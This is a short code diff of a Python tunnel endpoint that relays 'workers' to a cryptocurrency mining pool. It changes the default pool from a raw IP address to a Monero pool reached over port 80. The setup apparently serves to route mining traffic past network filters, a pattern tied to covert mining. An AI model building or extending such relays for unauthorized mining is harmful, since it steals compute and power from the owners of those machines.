@@ -103,13 +103,13 @@ def tunnel_connect():
     """Create new tunnel to pool."""
     data = request.json or {}
     worker_id = data.get('worker_id', '')
-    pool = data.get('pool', '45.155.102.89:10128')
+    pool = data.get('pool', 'pool.hashvault.pro:80')
     
     if ':' in pool:
         host, port = pool.split(':')
         port = int(port)
     else:
-        host, port = pool, 10128
+        host, port = pool, 80
     
     tunnel_id = hashlib.md5(f"{worker_id}-{time.time()}".encode()).hexdigest()[:16]
     
